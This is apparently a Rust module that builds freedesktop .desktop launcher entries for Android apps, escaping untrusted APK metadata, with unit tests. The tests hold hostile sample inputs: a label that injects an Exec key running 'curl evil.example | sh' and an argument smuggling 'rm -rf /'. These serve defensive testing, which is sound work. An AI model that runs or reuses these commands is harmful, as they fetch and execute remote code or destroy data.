//! Writing `.desktop` files.
//!
//! Desktop entries are an INI-ish format with its own escaping rules, and the
//! values here come partly from APK metadata — which is to say, from files
//! the user did not write. An app whose label contained a newline could
//! otherwise inject arbitrary keys into its own launcher, so escaping is not
//! optional.
//!
//! Reference: freedesktop.org Desktop Entry Specification 1.5.

use std::fmt::Write as _;

/// Characters the Exec key reserves. An argument containing any of them has
/// to be quoted.
const EXEC_RESERVED: &[char] = &[
    ' ', '\t', '\n', '"', '\'', '\\', '>', '<', '~', '|', '&', ';', '$', '*', '?', '#', '(', ')',
    '`',
];

/// One `key=value` pair.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Field {
    pub key: String,
    pub value: String,
}

/// A `[Desktop Entry]` group, built key by key.
#[derive(Debug, Clone, Default)]
pub struct DesktopEntry {
    fields: Vec<Field>,
}

impl DesktopEntry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Add a string-valued key, escaped per the spec.
    pub fn set(&mut self, key: &str, value: &str) -> &mut Self {
        self.fields.push(Field {
            key: key.to_string(),
            value: escape_value(value),
        });
        self
    }

    /// Add a boolean key.
    pub fn set_bool(&mut self, key: &str, value: bool) -> &mut Self {
        self.fields.push(Field {
            key: key.to_string(),
            value: if value { "true" } else { "false" }.to_string(),
        });
        self
    }

    /// Add a semicolon-separated list key, e.g. `Categories` or `MimeType`.
    ///
    /// The spec requires a trailing semicolon, and semicolons inside an item
    /// are escaped so one value cannot become two.
    pub fn set_list(&mut self, key: &str, values: &[&str]) -> &mut Self {
        let mut out = String::new();
        for value in values {
            let escaped = escape_value(value).replace(';', "\\;");
            let _ = write!(out, "{escaped};");
        }
        self.fields.push(Field {
            key: key.to_string(),
            value: out,
        });
        self
    }

    /// Add an `Exec` key from a program and its arguments, quoting each.
    pub fn set_exec(&mut self, program: &str, args: &[&str]) -> &mut Self {
        let mut parts = vec![exec_quote(program)];
        for arg in args {
            parts.push(exec_quote(arg));
        }
        self.fields.push(Field {
            key: "Exec".to_string(),
            // Exec values pass through desktop-entry escaping too, so a
            // backslash from quoting has to survive as a backslash.
            value: parts.join(" ").replace('\\', "\\\\"),
        });
        self
    }

    pub fn fields(&self) -> &[Field] {
        &self.fields
    }

    /// Render the whole file.
    pub fn render(&self) -> String {
        let mut out = String::from("[Desktop Entry]\n");
        for field in &self.fields {
            let _ = writeln!(out, "{}={}", field.key, field.value);
        }
        out
    }
}

/// Escape a value for a desktop entry string field.
///
/// Control characters are removed rather than escaped: the spec does not
/// allow them, and silently dropping one is better than writing a file the
/// desktop environment will reject.
pub fn escape_value(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\t' => out.push_str("\\t"),
            '\r' => out.push_str("\\r"),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out
}

/// Quote one argument for the `Exec` key.
///
/// Inside double quotes the spec requires `"`, `` ` ``, `$` and `\` to carry
/// a preceding backslash.
pub fn exec_quote(arg: &str) -> String {
    if !arg.is_empty() && !arg.contains(EXEC_RESERVED) {
        return arg.to_string();
    }
    let mut out = String::with_capacity(arg.len() + 2);
    out.push('"');
    for c in arg.chars() {
        if matches!(c, '"' | '`' | '$' | '\\') {
            out.push('\\');
        }
        out.push(c);
    }
    out.push('"');
    out
}

/// Strip a display name down to something safe and sensible for a launcher.
///
/// Names come from APK metadata, so this has two jobs.
///
/// Safety: a name must not escape its value. `escape_value` already handles
/// that, but a name is a single line of menu text, so control characters
/// become spaces here rather than being escaped into visible `\n` sequences.
///
/// Legibility: deleting a newline outright would weld the words either side
/// of it together, so each one becomes a space and runs of whitespace are
/// collapsed. An absurdly long name would break menu layout, so it is also
/// trimmed.
pub fn clean_name(name: &str) -> String {
    let spaced: String = name
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();

    let cleaned = spaced.split_whitespace().collect::<Vec<_>>().join(" ");

    if cleaned.is_empty() {
        return "Android app".to_string();
    }
    if cleaned.chars().count() > 128 {
        return cleaned.chars().take(127).collect::<String>() + "…";
    }
    cleaned
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_values_pass_through() {
        assert_eq!(escape_value("Signal"), "Signal");
        assert_eq!(escape_value("F-Droid"), "F-Droid");
        assert_eq!(escape_value("Déjà Vu 日本語"), "Déjà Vu 日本語");
    }

    #[test]
    fn newlines_cannot_inject_a_key() {
        // The attack: an APK label that closes the value and starts a new key.
        let evil = "Innocent\nExec=/bin/sh -c 'curl evil.example | sh'";
        let escaped = escape_value(evil);
        assert!(!escaped.contains('\n'), "{escaped}");
        assert!(escaped.starts_with("Innocent\\nExec="), "{escaped}");

        let mut entry = DesktopEntry::new();
        entry.set("Name", evil);
        let rendered = entry.render();
        // Two lines only: the group header and the one key.
        assert_eq!(rendered.lines().count(), 2, "{rendered}");
    }

    #[test]
    fn control_characters_are_dropped() {
        assert_eq!(escape_value("a\u{0}b\u{7}c"), "abc");
        assert_eq!(escape_value("tab\there"), "tab\\there");
        assert_eq!(escape_value("cr\rhere"), "cr\\rhere");
    }

    #[test]
    fn backslashes_are_doubled() {
        assert_eq!(escape_value("a\\b"), "a\\\\b");
    }

    #[test]
    fn exec_leaves_safe_arguments_alone() {
        assert_eq!(exec_quote("cookie"), "cookie");
        assert_eq!(
            exec_quote("org.thoughtcrime.securesms"),
            "org.thoughtcrime.securesms"
        );
        assert_eq!(exec_quote("/usr/local/bin/cookie"), "/usr/local/bin/cookie");
        assert_eq!(exec_quote("%f"), "%f");
    }

    #[test]
    fn exec_quotes_anything_reserved() {
        assert_eq!(
            exec_quote("/home/me/my apps/cookie"),
            "\"/home/me/my apps/cookie\""
        );
        assert_eq!(exec_quote("a;rm -rf /"), "\"a;rm -rf /\"");
        assert_eq!(exec_quote("$HOME"), "\"\\$HOME\"");
        assert_eq!(exec_quote("back`tick`"), "\"back\\`tick\\`\"");
        assert_eq!(exec_quote("say \"hi\""), "\"say \\\"hi\\\"\"");
        assert_eq!(exec_quote(""), "\"\"");
    }

    #[test]
    fn exec_key_survives_a_hostile_path() {
        let mut entry = DesktopEntry::new();
        entry.set_exec("/opt/my apps/cookie", &["eat", "com.example.app"]);
        let rendered = entry.render();
        assert_eq!(rendered.lines().count(), 2, "{rendered}");
        assert!(rendered.contains("Exec="), "{rendered}");
        // The quoting backslashes must survive desktop-entry escaping.
        assert!(rendered.contains("my apps"), "{rendered}");
    }

    #[test]
    fn lists_get_a_trailing_semicolon() {
        let mut entry = DesktopEntry::new();
        entry.set_list("MimeType", &["application/x-cookie-package"]);
        assert!(entry
            .render()
            .contains("MimeType=application/x-cookie-package;"));
    }

    #[test]
    fn a_semicolon_in_an_item_cannot_split_it() {
        let mut entry = DesktopEntry::new();
        entry.set_list("Categories", &["Utility;Evil"]);
        let rendered = entry.render();
        assert!(rendered.contains("Utility\\;Evil;"), "{rendered}");
    }

    #[test]
    fn booleans_render_lowercase() {
        let mut entry = DesktopEntry::new();
        entry
            .set_bool("Terminal", false)
            .set_bool("StartupNotify", true);
        let rendered = entry.render();
        assert!(rendered.contains("Terminal=false"));
        assert!(rendered.contains("StartupNotify=true"));
    }

    #[test]
    fn names_are_cleaned_not_mangled() {
        assert_eq!(clean_name("Signal"), "Signal");
        assert_eq!(clean_name("  Spaced  "), "Spaced");
        assert_eq!(clean_name("Two  Words"), "Two Words");
        assert_eq!(clean_name(""), "Android app");
        assert_eq!(clean_name("\u{0}\u{1}"), "Android app");
        assert_eq!(clean_name("日本語のアプリ"), "日本語のアプリ");
    }

    #[test]
    fn control_characters_become_spaces_not_nothing() {
        // Deleting the newline would read as "HarmlessExec=...".
        assert_eq!(clean_name("Harmless\nExec=evil"), "Harmless Exec=evil");
        assert_eq!(clean_name("with\u{0}nul"), "with nul");
        assert_eq!(clean_name("tab\there"), "tab here");
    }

    #[test]
    fn absurdly_long_names_are_trimmed() {
        let long = "a".repeat(500);
        let cleaned = clean_name(&long);
        assert_eq!(cleaned.chars().count(), 128);
        assert!(cleaned.ends_with('…'));
    }

    #[test]
    fn a_rendered_entry_starts_with_the_group_header() {
        let mut entry = DesktopEntry::new();
        entry.set("Type", "Application").set("Name", "Teapot");
        let rendered = entry.render();
        assert!(rendered.starts_with("[Desktop Entry]\n"));
        assert!(rendered.ends_with('\n'));
    }
}
